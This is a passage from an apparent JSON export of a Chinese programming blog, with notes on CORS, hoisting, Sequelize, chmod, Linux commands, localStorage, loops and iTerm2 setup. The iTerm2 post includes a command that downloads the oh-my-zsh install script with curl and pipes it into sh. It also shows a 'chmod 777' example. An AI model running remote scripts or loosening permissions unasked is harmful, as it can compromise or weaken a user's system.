結果如下： 除了不同源的問題之外，現在還蹦出了一個 Refused to set unsafe header \"user-agent\" 錯誤，簡單來說就是「不要亂改 user-agent，這樣會初四啦」。 這時候你檢查一下 request header，就能看到真的沒有被改掉： 但如果是在「不是瀏覽器」的情況下（例如 Node.js），就不會有這個限制： 123456789101112131415161718192021/* 備註：一樣是第九關的內容*/const API_ENDPOINT_V2 = 'https://lidemy-http-challenge.herokuapp.com/api/v2'request( { method: 'GET', url: `${API_ENDPOINT_V2}/sys_info`, headers: { Authorization: 'Basic YWRtaW46YWRtaW4xMjM=', 'X-Library-Number': '20', 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)' } }, (err, res, body) =&gt; { // 印出回傳的狀態碼 console.log(res.statusCode) // 印出 header 的資訊 console.log(res.request.headers) }) 結果： 123456200{ 'Authorization': 'Basic YWRtaW46YWRtaW4xMjM=', 'X-Library-Number': '20', 'User-Agent': 'Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)'} 所以看完這篇文章後一定要搞清楚 是不是在瀏覽器執行的？ 會影響最後的結果。 如果是，那你就要注意瀏覽器會有哪些限制，像剛剛介紹的「同源策略」和「不可以竄改 User-Agent」等等。 不是的話呢？那恭喜你，以上提到的限制全部都不會發生。 文末其實在玩遊戲的時候沒有考慮到那麼多事情，是因為看了 幕後花絮：Lidemy HTTP Challenge 的設計以及彩蛋 後才發現這些藏在裡頭的眉眉角角。 所以如果你原本跟我一樣沒有發現這些細節的話，希望這篇文章能夠為你帶來幫助。","link":"/2022/01/10/learn-cors-and-browser-limitations-from-game/"},{"title":"學 hoisting 之前先理解 EC 是什麼？","text":"從此不再怕 hoisting。 簡述簡單來說，JavaScript 雖然被稱作「直譯式語言」，但你不要真的把它想成是「一行一行執行」，因為如果真是如此的話 hoisting 的行為是很不合理的，例如說： 12console.log(a) var a = 10 輸出結果會是 undefined 而不是 ReferenceError: a is not defined，這個是 hoisting 的行為大家都知道，但重點是如果 JS 真的是一行一行執行的話。在執行 console.log(a) 的時候怎麼可能會知道後面有宣告 a？ 所以其實 JavaScript 是有「編譯」這個動作的。待會要談的 EC（Execution-Contexts）就是在談編譯階段時 JavaScript 到底都做了什麼？ 附註：這邊的編譯說法很有可能是錯的，會這樣說是因為我認為這樣子思考會比較好理解，所以你如果發現這是不對的話，不要太認真，確實就是我寫的不對。 關於 EC可以把 Execution-Contexts（執行環境）想成是一個箱子，裡面有個叫做 VO（Variable Object）的東西會儲存執行階段時所需的資訊。 每次進到一個 function 裡就會產生一個 EC，按照順序「堆疊（Stack）」，參考這張圖： 寫成程式碼會像這樣： 12345678910111213// 最外層會先產生一個 global ECfunction N () { // 產生 N 的 EC function N_1 () { // 產生 N_1 的 EC function N_2 () { // 產生 N_2 的 EC function Current () { // 產生 Current 的 EC } } }} 每個 EC 裡面都會有自己的 VO，那 VO 實際上到底裝什麼？直接來看例子： 1234567function test(a, b) { console.log(a) // 10 console.log(b) // undefined console.log(c) // undefined var c = 10}test(10) 在 test 中的 VO 就長這樣： 1234567test EC: { VO: { a: 10, b: undefined, c: undefined }} 所以在執行 test 的時候，碰到 console.log() 時就會到 VO 裡面去找資源，換句話說，VO 裡面沒有的東西，你就存取不到（嚴謹一點來說是按照 scope chain 往上找，直到找不到為止）。關於 scope chain 的機制，可以參考這篇：從 ECMAScript 來理解閉包與作用域的原理 那東西是怎麼放到 VO 裡面的？記住這些原則： function 優先 接著是 function 的參數，如果參數有值的話就儲存，沒有的話就設為 undefined 最後是 variable，一律設為 undefined 另外就是重複出現的時候該怎麼辦？我們一個一個來看： variable 會被忽略 123456function test(a, b) { console.log(a) // 10 var a = 100 console.log(a) // 100}test(10, 5) 123456test EC: { VO: { a: 10, b: 5 }} 在第一個 console.log(a) 的時候，VO 中的 a=10，所以印出 10。到了第二個 console.log(a) 的時候，a 因為在上一行被重新賦值，所以 a=100 最後印出 100。 這邊要強調的是 Variable 在 VO 初始化時，不會把原本的 a:10 覆寫成 a:undefined 而是被忽略。 function 會直接覆寫 12345678function test(a, b) { console.log(a) // [Function: a] function a() { console.log('我最優先') } console.log(a) // [Function: a]}test(10, 5) 在碰到 functino 前的 VO 是長這樣： 123456test EC: { VO: { a: 10, b: 5 }} 但碰到 function 後會變這樣： 123456test EC: { VO: { a: Function, b: 5 }} 這裡的 Function 想成是指標就好，實際儲存的是記憶體位置。 所以你只要知道編譯完後的 VO 長什麼樣子，就絕對不會搞錯 hoisting 的行為是什麼。 最後一塊拼圖 LHS 賦值 &amp; RHS 查詢值剛剛講的是編譯階段，現在來講「執行階段」。 執行階段中有兩個術語，分別是： LHS（Left hand side）引用 RHS（Right hand side）引用 簡單來說 LHS 就是「請幫我去找這個變數的位置在哪裡，因為我要對它賦值，RHS 則是「請幫我去找出這個變數的值，因為我要用這個值。 12var a = 10console.log(a) Line1 var a = 10 JS 引擎：global scope，我這裡有個對 a 的 LHS 引用，你有看過它嗎？執行結果：scope 說有，所以成功找到 a 並且賦值 Line2 console.log(a) JS 引擎：global scope，我這裡有個對 a 的 RHS 引用，你有看過它嗎？執行結果：scope 說有，所以成功返回 a 的值 不再畏懼 hoisting你只要掌握了「編譯階段」是怎麼初始化的？還有「執行階段」是怎麼執行的？我相信任何跟 hoisting 有關的問題都不再是問題，最後讓我們來從頭到尾演練一次看看： 1234567891011121314151617181920var a = 1;function test(){ console.log('1.', a); var a = 7; console.log('2.', a); a++; var a; inner(); console.log('4.', a); function inner(){ console.log('3.', a); a = 30; b = 200; }}test();console.log('5.', a);a = 70;console.log('6.', a);console.log('7.', b); 我們先從 VO 開始： 1234567891011121314151617181920// globalglobal EC{ VO: { a: undefined, test: Function, }}// testtest EC { VO: { a: undefined, inner: Function, }}// inner 沒有做任何宣告，所以是空的 inner EC { VO: {}} 接著來一行一行執行： Line1 var a = 1 JS 引擎：global scope，我這裡有個對 a 的 LHS 引用，你有看過它嗎？執行結果：global scope 說有，所以成功找到 a 並且賦值（a=1） Line16 test() JS 引擎：global scope，我這裡有個對 test() 的 RHS 引用，你有看過它嗎？執行結果：global scope 說有，所以成功找到 test() 並執行 function Line3 console.log(‘1.’, a) JS 引擎：test scope，我這裡有個對 a 的 RHS 引用，你有看過它嗎？執行結果：test scope 說有，所以成功找到返回 a 的值（undefined） Line4 var a = 7 JS 引擎：test scope，我這裡有個對 a 的 LHS 引用，你有看過它嗎？執行結果：test scope 說有，所以成功找到 a 並且賦值（a=7） Line5 console.log(‘2.’, a) JS 引擎：test scope，我這裡有個對 a 的 RHS 引用，你有看過它嗎？執行結果：test scope 說有，所以成功找到返回 a 的值（7） Line6 a++（a = a + 1） JS 引擎：test scope，我這裡有個對 a 的 RHS 和 LHS 引用，你有看過它嗎？執行結果：test scope 說有，所以成功找到返回 a 的值（7），並且賦值（7 + 1 = 8） Line7 var a 這一行沒有做任何事，所以不做任何動作。 Line8 inner() JS 引擎：test scope，我這裡有個對 inner() 的 RHS 引用，你有看過它嗎？執行結果：test scope 說有，所以成功找到 inner() 並執行 function Line11 console.log(‘3.’, a) JS 引擎：inner scope，我這裡有個對 a 的 RHS 引用，你有看過它嗎？執行結果：inner scope 說沒有，所以去問上一層的 test scopeJS 引擎：test scope，我這裡有個對 a 的 RHS 引用，你有看過它嗎？執行結果：test scope 說有，所以成功找到返回 a 的值（8） Line12 a = 30 JS 引擎：inner scope，我這裡有個對 a 的 LHS 引用，你有看過它嗎？執行結果：inner scope 說沒有，所以去問上一層的 test scopeJS 引擎：test scope，我這裡有個對 a 的 LHS 引用，你有看過它嗎？執行結果：test scope 說有，所以成功找到 a 並且賦值（a=30） Line13 b = 200 JS 引擎：inner scope，我這裡有個對 b 的 LHS 引用，你有看過它嗎？執行結果：inner scope 說沒有，所以去問上一層的 test scopeJS 引擎：test scope，我這裡有個對 b 的 LHS 引用，你有看過它嗎？執行結果：test scope 說沒有，所以去問上一層的 global scopeJS 引擎：global scope，我這裡有個對 b 的 LHS 引用，你有看過它嗎？執行結果：global scope 說沒有。 這邊會有兩種結果： 非嚴格模式：把 b 加到 global EC 中並設值為 200 嚴格模式：ReferenceError: b is not defined Line9 console.log(‘4.’, a) JS 引擎：test scope，我這裡有個對 a 的 RHS 引用，你有看過它嗎？執行結果：inner scope 說有，所以成功找到返回 a 的值（30） Line17 console.log(‘5.’, a) JS 引擎：global scope，我這裡有個對 a 的 RHS 引用，你有看過它嗎？執行結果：global scope 說有，所以成功找到返回 a 的值（1） Line18 a = 70 JS 引擎：global scope，我這裡有個對 a 的 LHS 引用，你有看過它嗎？執行結果：global scope 說有，所以成功找到 a 並且賦值（a=70） Line19 console.log(‘6.’, a) JS 引擎：global scope，我這裡有個對 a 的 RHS 引用，你有看過它嗎？執行結果：global scope 說有，所以成功找到返回 a 的值（70） Line20 console.log(‘7.’, b) （假設這邊是非嚴格模式） JS 引擎：global scope，我這裡有個對 b 的 RHS 引用，你有看過它嗎？執行結果：global scope 說有，所以成功找到返回 b 的值（200） 關於 let 與 const 的 Temporal Dead Zone(TDZ)其實就跟 var 宣告的變數一樣，let 跟 const 在編譯階段的時候一樣會被放到 VO 裡面，但不會被設成 undefined，這是最重要的差別，例如說： 1234567function test() { console.log(b) // undefined console.log(a) // ReferenceError let a = 10 var b = 20}test() 初始化的 EC 長這樣： 123456test EC{ vo: { a: 不會設值, b: undefined }} 因為 VO 中的 a 沒有值，所以跑到 console.log(a) 的時候會直接 ReferenceError: Cannot access 'a' before initialization。 在執行到 let a = 10 這行之前就叫做「Temporal Dead Zone(TDZ)」，只要在 TDZ 期間去存取變數都會直接噴錯，其實就只是這樣，不用被專有名詞嚇到，let 跟 const 一樣有 hoisting 的行為，沒有例外。 結尾其實這篇筆記寫的有點混亂，可能是我還不夠熟悉吧，但目前我所知道的就是這樣，之後等我更理解後再來慢慢補齊。 另外還想補充的一點是，function 之所以能夠互相呼叫就是透過「編譯階段產生的 VO 」來達成的，有了 VO 後 function 就可以參考 VO 去呼叫另外一個 function，像這樣： 1234567function a() { b()}a()function b() { console.log('yo')} 123456global EC{ VO: { a: Function, b: Function }} 大概就是這樣，其他的等以後再補吧～","link":"/2022/02/02/learn-execution-contexts-before-hoisting/"},{"title":"從解讀 Sequelize 的執行檔來學習 Node.js 的檔案相關 API","text":"該是來補這個坑了。 簡述這篇學完後我應該要學到： __dirname，目前位置的資料夾路徑 __filename，目前位置的檔案路徑 path.basename，讀取路徑最後的資料夾 / 檔案的名稱 fs.readdirSync，讀取資料夾底下的所有檔案 / 資料夾 path.join 拚路徑遊戲，填什麼就接什麼 總之廢話不多說，直接來看 code： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556'use strict';// 完整路徑 = D:\\restaurant\\models\\index.js// __dirname = D:\\restaurant\\models（只含資料夾）// __filename = D:\\restaurant\\models\\index.js（包含檔案）// path.basename(__filename) = index.js 取得檔案名稱// path.basename(__filename, '.js') = index 去掉附檔名const fs = require('fs');const path = require('path');const Sequelize = require('sequelize');const basename = path.basename(__filename);// 如果有 set NODE_ENV 就會儲存，不然就存 development（記得不要空格，很雷）const env = process.env.NODE_ENV || 'development';// 引入 config.js，並讀取 env 屬性const config = require(__dirname + '/../config/config.js')[env];const db = {};let sequelize;// 到 config 找有沒有 use_env_variable 屬性（它的值應該代表某個環境變數）if (config.use_env_variable) { // 有的話就套用它的連線資訊：mysql://root:password@mysql_host.com/database_name sequelize = new Sequelize(process.env[config.use_env_variable], config);} else { // 沒有的話就是用 username + database + ... 的格式 sequelize = new Sequelize(config.database, config.username, config.password, config);}/* 1. 讀取目前資料夾底下的所有檔案 [ 'announcement.js', 'index.js', 'prize.js', 'user.js' ] 2. 留下是檔案的東西（.） &amp;&amp; 不是 index.js &amp;&amp; 是 .js 的檔案 3. 把這些檔案引入後 call function（引入進來的東西都是 function） 4. 把建立的 model 綁到 db[model.name] 上 5. 讀取 db 的每個 key，如果有建立關聯（associate），就把它們綁起來*/fs .readdirSync(__dirname) .filter(file =&gt; { return (file.indexOf('.') !== 0) &amp;&amp; (file !== basename) &amp;&amp; (file.slice(-3) === '.js'); }) .forEach(file =&gt; { const model = require(path.join(__dirname, file))(sequelize, Sequelize.DataTypes); db[model.name] = model; });Object.keys(db).forEach(modelName =&gt; { if (db[modelName].associate) { db[modelName].associate(db); }});db.sequelize = sequelize;db.Sequelize = Sequelize;module.exports = db; 看懂這份檔案後，我才知道環境變數到底怎麼調，不然實在是霧煞煞。","link":"/2022/04/02/learn-nodejs-files-api-from-sequelize/"},{"title":"從 chmod 認識 Linux 中的權限管理","text":"寫一篇一勞永逸的筆記。 簡述不論是 Linux 還是其他作業系統，都會有個東西：權限管理 權限管理是用來限制這三個動作： Read 讀取 Write 寫入 Execute 執行 作業系統通常會透過權限管理來設定「什麼身分可以做什麼事？」。 來看個例子，例如在 CLI 輸入： 1ls -l 輸出結果會是： 1234567drwxr-xr-x 1 user 197121 0 十二月 8 2020 '$RECYCLE.BIN'/drwxr-xr-x 1 user 197121 0 二月 16 17:04 addetector/-rw-r--r-- 1 user 197121 517 二月 21 21:13 caeser.jsdrwxr-xr-x 1 user 197121 0 六月 25 2021 Config.Msi/drwxr-xr-x 1 user 197121 0 三月 7 20:03 Download/drwxr-xr-x 1 user 197121 0 三月 11 22:48 mentor-program-5th-benben6515/drwxr-xr-x 1 user 197121 0 一月 22 18:16 mentor-program-5th-chachachater/ 大概解釋一下這要怎麼看，拿 -rw-r--r-- 1 user 197121 517 二月 21 21:13 caeser.js 來舉例： -rw-r--r-- 權限（不是資料夾，所以開頭用 - 表示） user 目前使用的身分 197121 git 內建的群組（group）身分 517 檔案大小（Byte） 二月 21 21:13 最後修改日期（2/21 09:13 PM） caeser.js 檔案名稱 順道一提，d 是用來代表資料夾的意思，所以用 d 開頭的就是資料夾。 關於權限的部分留到下面來解說。 先認識使用者種類Linux 定義了三種身分，分別是： owner group others 每一種身分都有自己的權限： r（Read） w（Write） x（Execute） 所以可以畫成一個表格： 這時候再回來看 rw-r--r-- 應該就很好懂了： Owner 具備 Read 和 Write 的權限 Group 具備 Read 的權限 Others 具備 Read 的權限 就這樣啦，沒有很複雜。 關於 chmod 指令chmod 的全文是 change mode，是用來「變更權限」的指令，也就是 rwx 這三個權限囉。 你應該都是這樣用的： 123chmod 777 someting.txtchmode a=rwx someting.txtchmode ugo=rwx someting.txt 三個都是一樣的，只差在寫法不同而已。最常見的是第一種用「數字」來表示。（因為比較方便嘛） 至於數字的寫法，網路會教你什麼 [4 + 2 + 1] 之類的算法，我自己看的是蠻混亂的，所以來講一個我覺得比較好理解的方法。 這個方法就是把每一個數字都轉成「二進位」，參考這張圖： 變成 0101 以後，就可以知道對應的 rwx 是 true 還是 false 了： 所以以此類推，最後可以得出： Owner rwx Group r– Others -w- 結合且來就是 rwxr---w-。 如果你覺得自己算很麻煩，可以參考這裡：chmod 計算機 就是這樣囉！","link":"/2022/03/14/linux-chmod/"},{"title":"Linux 中的指令","text":"做個筆記。 簡述在 一刀未剪的 AWS 部署紀錄 裡面有用到 Linux 指令，當時沒有特別解釋，所以這邊重新介紹一下。 這裡只會簡單介紹用法，比較細節的部份可以參考：Linux 的 su 與 sudo 指令教學與範例 sudo 與 su這兩個都是跟「使用者權限」相關的指令。 一般作業系統都會做「權限管理」，像你要讀某些檔案或改某些設定時，系統會先檢查你的權限。如果你權限不足的話就不讓你做。 在 Linux 系統也一樣，權限最高的使用者是「root」，不過不建議你直接以 root 的身分登入，因為可以做任何修改，改錯東西的話可能會把整個系統玩壞。所以建議等真的有需要時才透過 su 或 sudo 來開啟 root 的權限。 附註：su 的全文是 super user，而 sudo 則是 super user do。 su 指令用法很簡單，只要輸入 su 後再輸入密碼就可以取得權限： 1su sudo 指令這就是我部署時用的，可以想成是「用 root 的權限執行某個指令」： 12# 複製檔案sudo cp myfile.php newfile.php apt 指令apt 的全名是「Advanced Packaging Tool」，中文是「進階打包工具」。 其實就是套件管理器，所以可以把它想成是 Linux 版的 NPM，這樣就能馬上理解它是幹嘛用的了。 附註：apt 必須有 root 權限，所以得搭配 sudo 來使用。 例如在部署時有個步驟是安裝 tasksel 這個套件： 1sudo apt install tasksel 這就跟你用： 1npm install jquery 的概念 87 分像對吧？所以這就是它的用法。 接下來介紹一下部署時的用到的幾個指令。 sudo apt update1sudo apt update 這個指令會列出所有可以更新的套件： 網路上可能會看到 apt-get 的用法，不過它跟 apt 幾乎是一樣的東西。大概就跟 jQuery 的 $().click 差不多，只是把比較常用的指令抽出來而已。 sudo apt upgrade如果要指定套件的話會在後面加上 &lt;package&gt;，沒有加就把可以更新的套件都更新： 1sudo apt upgrade sudo apt dist-upgrade1sudo apt dist-upgrade 這個可以想成是 sudo apt upgrade 的延伸。簡單來說： sudo apt upgrade 如果要更新的套件有相依性問題要處理，那就不更新（風險較低） sudo apt dist-upgrade 有相依問題會自動幫你處理好，並且更新套件（風險較高） 所以根據需求來做選擇就好。","link":"/2022/03/11/linux-command/"},{"title":"在 Node.js 設定環境變數的方法","text":"隱私很重要。 方法1－NODE_ENV看不懂我寫的話可以看這篇：使用process.env.NODE_ENV的正确姿势 通常這個是用來區隔 development | test | production 這三種不同的執行環境，所以你只要看到有段 code 裡面有 NODE_ENV 這個環境變數，那這份專案的 package.json 也一定會有段 script 是這樣寫的： 123\"scripts\": { \"secret\": \"set NODE_ENV=hahahaha &amp;&amp; node index.js\"} 備註：一定要透過 npm script 才有用，如果直接在 terminal 上執行是讀取不到的。（原因可以參考 npm script 與 npx 的用途） 接著就可以在 index.js 裡面存取了： 12// index.jsconsole.log(process.env.NODE_ENV) // hahahaha 方法2－使用 dotenv 套件流程如下： 用 npm 下載 這個 套件 在專案根目錄建立 .env 檔案 （不要加名稱，真的就是 .env 而已） 在 .env 裡面寫你要儲存的變數 在 index.js 裡面載入 dotenv 就可以透過 process.env 取得 .env 寫好的變數 下面簡單演示一下。 設定環境變數： 123// .envNAME=PEANUINTERESTING=CODING 載入環境變數並存取： 123require('dotenv').config()console.log(process.env.NAME) // PEANUconsole.log(process.env.INTERESTING) // CODING","link":"/2022/01/07/load-environment-variable/"},{"title":"Loading-overlay 懶人包","text":"應該之後會蠻常用到的，記起來。 簡述先設定 options： 12345678// loading 效果$.LoadingOverlaySetup({ background: \"rgba(0, 0, 0, 0.6)\", imageAnimation: false, image: './spinner.svg', imageColor: '#FFD369', size: '50'}); 詳細可參考這裡 接著只要： 1234// 打開 loading 畫面$.LoadingOverlay('show');// 關閉 loading 畫面$.LoadingOverlay('hide'); 這樣就 OK 囉！","link":"/2022/02/23/loading-overlay-usage/"},{"title":"借放一下啊！localStorage 與 sessionStorage","text":"有借無還。 簡述兩個都是用來儲存資料，儲存範圍是以「Domain」為單位，例如說你在 google.com 儲存了 username: PeaNu，那就只有在這個 Domain 裡面可以存取，超出這個範圍就拿不到。 查看方式（一張圖勝千言）： 兩個的差異： localStorage 永久保存 AND 不同分頁可以共用儲存的內容 sessionStorage 關掉瀏覽器就消失 AND 每個分頁獨立儲存，不能共用 其他注意事項： value 只能儲存字串（別忘了 JSON 也是字串，所以這樣就很好用了） localStorage介紹一下基本用法： window.locaoStorage.setItem(key, value) window.locaoStorage.getItem(keyName) window.locaoStorage.rmoevItem(keyNmae) （window 可省略，因為 window 是瀏覽器下的全域物件） 12345678&lt;div class=\"input-block\"&gt; &lt;span class=\"input-block__text\"&gt;姓名：&lt;/span&gt; &lt;input class=\"input-block__input\" type=\"text\" size=\"20\"&gt; &lt;button class=\"input-block__button\"&gt;儲存&lt;/button&gt;&lt;/div&gt;&lt;!-- 用來顯示儲存的內容 --&gt;&lt;div class=\"block\"&gt;&lt;/div&gt;&lt;div class=\"block\"&gt;&lt;/div&gt; JavaScript： 12345678910111213141516171819202122232425262728293031/* 重新整理後到 localStorage 抓內容 分別寫入： .input-block__input: 輸入框 .input-block__input: 第一個區塊（JSON 解析後抓內容） .input-block__input: 第二個區塊（原始字串）*/const oldValue = localStorage.getItem('username')if (oldValue) { document.querySelector('.input-block__input').value = oldValue document.querySelectorAll('.block')[0].innerText = JSON.parse(oldValue).username document.querySelectorAll('.block')[1].innerText = oldValue}// 按下按鈕儲存document.querySelector('.input-block__button') .addEventListener('click', function(e) { setLocalStorage('.input-block__input', 'username') }, false)// 支援 Enter 鍵 window.addEventListener('keydown', function(e) { e.stopPropagation() if (e.key === 'Enter') setLocalStorage('.input-block__input', 'username')}, true)// 儲存到 localStoragefunction setLocalStorage(selector, key) { const input = document.querySelector(selector).value if (input) return localStorage.setItem(key, input) alert('請輸入你想儲存的內容')} seesionStorage用法跟 localStorage 差不多： window.sessionStorage.setItem(key, value) window.sessionStorage.getItem(keyName) window.sessionStorage.rmoevItem(keyNmae) 特別注意每個分頁都會建立一個 session，因此不同分頁不能共用內容，另外關掉瀏覽器後會清除所有內容，這點是跟 loaclStorage 最大的差別。 有點類似遊戲裡面的「密語視窗」吧，你只要視窗沒關掉對話紀錄就會保留，但一關掉就會清除。開新分頁可以想成是開新的密語視窗，等同網頁中的建立新的「session」。至於內容的部分就跟聊天室窗一樣，因為是全新的 session，所以當然不會有以前的紀錄，內容會是空的。 一樣簡單示範（其實就只是都改成 sessionStorage）： 12345678&lt;div class=\"input-block\"&gt; &lt;span class=\"input-block__text\"&gt;姓名：&lt;/span&gt; &lt;input class=\"input-block__input\" type=\"text\" size=\"20\"&gt; &lt;button class=\"input-block__button\"&gt;儲存&lt;/button&gt;&lt;/div&gt;&lt;!-- 用來顯示儲存的內容 --&gt;&lt;div class=\"block\"&gt;&lt;/div&gt;&lt;div class=\"block\"&gt;&lt;/div&gt; JavaScript： 123456789101112131415161718192021222324252627282930313233/* 重新整理後到 sessionStorage 抓內容 分別寫入： .input-block__input: 輸入框 .input-block__input: 第一個區塊（JSON 解析後抓內容） .input-block__input: 第二個區塊（原始字串）*/const oldValue = sessionStorage.getItem('username')if (oldValue) { document.querySelector('.input-block__input').value = oldValue document.querySelectorAll('.block')[0].innerText = JSON.parse(oldValue).username document.querySelectorAll('.block')[1].innerText = oldValue}// 按下按鈕儲存document.querySelector('.input-block__button') .addEventListener('click', function(e) { setSessionStorage('.input-block__input', 'username') }, false)// 支援 Enter 鍵 window.addEventListener('keydown', function(e) { e.stopPropagation() if (e.key === 'Enter') setSessionStorage('.input-block__input', 'username')}, true)// 儲存到 localStoragefunction setSessionStorage(selector, key) { const input = document.querySelector(selector).value if (input) return sessionStorage.setItem(key, input) alert('請輸入你想儲存的內容')}","link":"/2022/01/20/local-storage-and-session-storage/"},{"title":"重新認識迴圈","text":"沒有那麼複雜。 從 label 與 goto 來理解迴圈的本質先介紹這兩個東西是因為不管是哪種迴圈，本質都是這三樣東西： 初始值 終止條件 每一圈要做的事（更新控制迴圈的變數值） 如果把每種迴圈的步驟拆出來分析，會發現背後的概念都是用label 跟 goto 來實作的。 （JavaScript 沒有這個語法，純粹只是要解釋這個概念） 12345678var i = 1 // 初始值loop: // labelconsole.log(i) // 每一圈要做的事i++ // 更新控制迴圈的變數if (i &lt;= 10) { // 終止條件 goto loop // goto lbael (loop) }console.log('finished') // loop end 試著自己把一個步驟走過一遍： 建立初始值 i = 1 loop 是標籤，不理它 印出 i 更新 i 終止條件，i&lt;=10 的話就跳回 loop 印出 finished 最後你會發現這就跟你用迴圈的語法寫出來的結果一樣： 123456789101112345678910finished do while 先做再說因為 do while 不常用，所以還蠻常忘記它的語法。一個比較直覺的想法：一個迴圈就是一個 block，所以要做（do）的事情就放在 block 裡。 do while 的流程： 初始值 每一圈要做的事（更新控制迴圈的變數值） 終止條件 12345var i = 0do { console.log(i) i++} while (i &lt;= 10) while 就是我熟悉的它while 跟 do whie 最不一樣的地方是：「先判斷條件」，接著才執行迴圈區塊。 while 的流程： 初始值 終止條件 每一圈要做的事（更新控制迴圈的變數值） 單舉例子太無聊了，所以做點有趣的： 12345var i = 0while (i &lt;= 10) { console.log(i++)}console.log('i = ', i) i++ 寫在 log 也沒問題哦！（不知道為什麼的話罰你回去看 i++ 是什麼意思） for loop其實 for 跟 while 的流程是一樣的： 初始值 終止條件 每一圈要做的事（更新控制迴圈的變數值） 只是 while 的結構寫起來沒有那麼好讀： 123456var i = 0 // 初始值while (i &lt;= 100) { // 終止條件 console.log(i) // ... i+=2 // 每一圈要做的事} for 把東西都寫在一行裡，一目了然： 12345// 同一行所以要句點for (var i=0; i&lt;=100; i++) { console.log(i) // ...} 在幫你複習一下，如果你用 label 跟 goto 的概念來解析 for 跟 while 的話，會發現做的事情都一樣： 1234567var i = 0:check if (i&lt;=10) { console.log(i) i++ goto check}console.log('finished') 初始值 終止條件（不符合就跳第五步） 執行迴圈 block（更新控制變數的值） 跳回第二步 結束 break 與 continue即便迴圈本身已經自帶「終止條件」，但有些時候我們會想要在執行「迴圈 block」的過程中來控制迴圈的執行流程： 跳出迴圈 忽略掉那一圈要做的事情 這個時候 break 跟 continue 就派上用場了。 break碰到 break 時，不會執行之後的指令，直接跳出迴圈。 這裡利用 break 來在迴圈區塊中建立終止條件： 123456789var i = 0do { console.log(i) i++ if (i &gt; 100) { break }} while (true)console.log('i=', i) 儘管 while (true) 會蹦出一個「無窮迴圈」，但因為我們在迴圈區塊使用了 break 來控制流程，所以在 i=101 的時候，迴圈就會結束。 continue碰到 continue 時，不會執行之後的指令，直接跳下一圈迴圈。 這裡寫一個碰到奇數就跳下一圈的迴圈： 123456789var i = 0do { if (i&amp;1) { i++ continue } console.log(i) i++} while (i &lt;= 10) 簡單的應用用三種不同的迴圈來「印出分數的總和」 do while 123456789var i = 0var scores = [70, 32, 52, 66, 90]var sum = 0do { sum += scores[i] i++} while(i&lt;scores.length)console.log(sum) while 12345678var scores = [70, 32, 52, 66, 90]var sum = 0var i = 0while (i&lt;scores.length) { sum += scores[i] i++}console.log(sum) for 123456var scores = [70, 32, 52, 66, 90]var sum = 0for (var i=0; i&lt;scores.length; i++) { sum += scores[i]}console.log(sum) i&lt;n 跟 i&lt;=n 的理解方式剛開始學迴圈的時候很常會搞混 &lt; 跟 &lt;= 的差別。其實有個簡單的判斷法： i&lt;5，只會執行到 4 i&lt;=5，會執行到 5 我的記法是只要看到 &lt;=，就表示一定會碰到 n；不是的話就是 n - 1 搭配 Array.length 使用的時候，通常都是寫 &lt;，因為「索引值」是從 0 開始，所以假設長度是 5，最後一個索引值就會是 4：0 =&gt; 1 =&gt; 2 =&gt; 3 =&gt; 4","link":"/2021/12/18/loop/"},{"title":"設定 Mac iterm2 懶人包","text":"真的美。 只是想順便記一下的快捷鍵 Command + T 可以開新分頁 Command + Left / Right 可以切換分頁 Commadn + W 關閉目前的分頁 簡述1. 安裝 iTerm2 2. 下載配色主題 我推薦的有： dracula Tomorrow Night 下載下來的資料夾裡面會有一個 .itermcolors，接著打開 iterm2 &gt; Preferences &gt; Profile &gt; Colors， 右下角的下拉選單有一個 import 選項，點選後把剛剛的檔案引入進去後，下一次就可以選擇了。 3. 安裝字型 有些比較潮的符號不吃原生字型，所以記得要下載字體，我用的是 JetBrainsMono，裡面有分成 Mac 或 Window 版本，記得下載正確的。 下載好後一樣到 Preferences 去改就行了。 4. 安裝 oh-my-zsh 1sh -c \"$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)\" 5. 設定主題 附註：要改主題都會到 ~/.zshrc 來改。 1vim ~/.zshrc 接著找到 ZSH_THEME，把它改成你要的那個主題就行了，我是用 tonotdo 6. 修改主題設定 這邊是針對 tonotdo 來做的額外設定，詳細可以參考[心得] iTerm2 + zsh，打造更好的工作環境 總之把前三行改成這樣就行了： 1PROMPT='%{$fg_no_bold[yellow]%}[%*] %{$fg_no_bold[cyan]%}%n%{$fg_no_bold[red]%} ➜ %{$fg_no_bold[green]%}%3~$(git_prompt_info)%{$reset_color%}» ' 以上，最後副個結尾圖！ 參考資源 Mac 終端機 (Terminal)設定： iTerm 2 [心得] iTerm2 + zsh，打造更好的工作環境","link":"/2022/05/11/mac-iterm2-set-up/"},{"title":"mentor-program-day01","text":"今天是參加學習計畫的第一天，也是第一份紀錄。 不知道你們有沒有看過一些電影或卡通，通常科學家或是實驗家都會在做自己做測試的時候拍一段紀錄的影片，把每一天都記錄下來。我覺得現在的自己就好像那些角色一樣。 進度今天很快地就把 Command Line 的課程給看完了，還有 Git 的部分看到了 32% 的進度。 我也不知道這樣算快還是慢，但至少自己是覺得這樣的進度還 OK。 學到的事情首先是 Command Line 的部分。 在上課之前，我最常用的就是 cd、ls、start 這幾個指令。看來我確實有點少用 Command Line 來做操作，太依賴 GUI 了。 以下這些是我在今天上完課後復習到的指令： pwd 印出目前的位置 man 查看指令的用說明 touch 更改檔案的最後修改時間，或是建立新檔案（碰一下） rm 刪除檔案 mkdir 建立新的資料夾 cp 複製檔案 vim 進入文字編輯器 vim（這個真的不錯，我在今天才知道它的實用性） i 進入編輯模式（可以插入文字） esc 進入普通模式 grep 抓出關鍵字 wget 下載外部檔案 curl 送出 request（我到今天才知道這個指令的用途，真是慚愧） cat 連結檔案，如果只指定一個檔案的話會直接印出內容（記得以前有學過，但太久沒摸就忘了，好在今天又回來上了這門課） pipe 組合計施展，把左邊的 output 當作右邊的 input（跟 cat 一樣，記得這兩個都是在 Coding 火球術的時候學到的指令） 接著是關於 Git 的部分。 不得不說「資料夾模擬法（我也不知道要怎麼形容，就別吐槽我了）」的這種講解方式，真的彷彿醍醐灌頂。默默的為以前看書學 Git 的我感到淡淡的哀傷。 我很喜歡用日常生活上的例子來解釋版本控制這件事，還有從自己建立一個版本控制的觀念來窺視 Git 背後的簡單概念。工具確實是用來幫助我們更好的去解決某些問題，而不是用來拖累我們，我覺得我漸漸地能理解這個說法背後的涵義了。 今天學到的 Git 